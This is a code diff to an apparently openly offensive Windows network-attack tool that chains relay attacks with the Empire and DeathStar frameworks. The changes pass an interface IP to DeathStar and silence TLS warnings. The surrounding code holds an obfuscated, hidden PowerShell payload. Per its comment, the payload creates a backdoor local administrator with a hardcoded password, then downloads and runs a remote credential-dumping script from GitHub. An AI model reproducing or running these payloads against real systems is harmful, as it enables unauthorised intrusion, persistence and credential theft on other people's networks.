@@ -8,6 +8,7 @@ import string
 import signal
 import random
 import asyncio
+import requests
 import argparse
 import functools
 import netifaces
@@ -21,6 +22,10 @@ from subprocess import Popen, PIPE, check_output, CalledProcessError
 
 # debug
 #from IPython import embed
+
+# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Prevent JTR error in VMWare
 os.environ['CPUID_DISABLE'] = '1'
@@ -750,7 +755,7 @@ def run_relay_attack(iface, args):
     if args.command:
         remote_cmd = args.command
     elif args.auto:
-        remote_cmd = get_empire_launcher_cmd()
+        remote_cmd = get_empire_launcher_cmd(iface)
     else:
         # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
@@ -1092,12 +1097,12 @@ def get_launcher_cmd(base_url, token):
     print(r.json())
     raise
 
-def get_empire_launcher_cmd():
+def get_empire_launcher_cmd(iface):
     base_url = 'https://0.0.0.0:1337'
     user = 'icebreaker'
     passwd = 'P@ssword123456'
     empire_cmd = 'cd submodules/Empire;python2 empire --rest --username icebreaker --password P@ssword123456'
-    ds_cmd = 'python submodules/DeathStar/DeathStar.py -u icebreaker -p P@ssword123456'
+    ds_cmd = 'python submodules/DeathStar/DeathStar.py -u icebreaker -p P@ssword123456 -lip http://{}:8080 -lp 8080'.format(get_local_ip(iface))
 
     empire_proc = run_proc_xterm(empire_cmd)
     # Time for Empire to load
